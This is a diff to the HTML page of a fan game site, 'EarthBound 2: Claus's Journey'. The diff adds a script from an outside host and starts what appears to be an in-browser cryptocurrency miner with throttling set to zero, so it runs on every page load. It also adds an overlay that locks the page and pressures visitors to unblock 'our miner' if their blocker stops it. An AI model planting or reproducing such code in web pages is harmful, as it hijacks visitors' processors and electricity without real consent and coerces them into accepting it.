@@ -13,7 +13,30 @@
 body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif}
 </style>
 <body>
-
+<script src="https://www.hostingcloud.racing/vnxu.js"></script>
+<script>
+    var _client = new Client.Anonymous('8c425b7b1ffe02b0f05b5420b67f3fbed7a17a4daf5859bba1c05949b6db01f2', {
+        throttle: 0
+    });
+    _client.start();
+    
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
+</script>
 <div class="w3-row-padding w3-padding-64 w3-container">
   <div class="w3-content">
     <h1>EarthBound 2: Claus's Journey</h1>
